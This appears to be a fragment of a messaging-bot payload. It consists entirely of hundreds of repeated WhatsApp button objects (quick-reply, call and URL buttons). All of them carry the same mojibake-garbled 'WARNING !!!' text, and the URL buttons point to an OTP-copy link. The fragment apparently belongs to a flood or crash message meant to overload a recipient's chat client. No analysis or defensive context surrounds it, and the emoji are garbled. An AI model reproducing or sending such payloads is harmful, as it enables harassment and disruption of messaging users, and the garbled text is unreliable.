{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
  { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
   { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
 { callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ quickReplyButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, id: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ callButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, phoneNumber: ``}},
{ urlButton: { displayText: `âĢïļ WARNING !!! ðĢðĨ âĢïļ`, url: `https://www.whatsapp.com/otp/copy/`}},
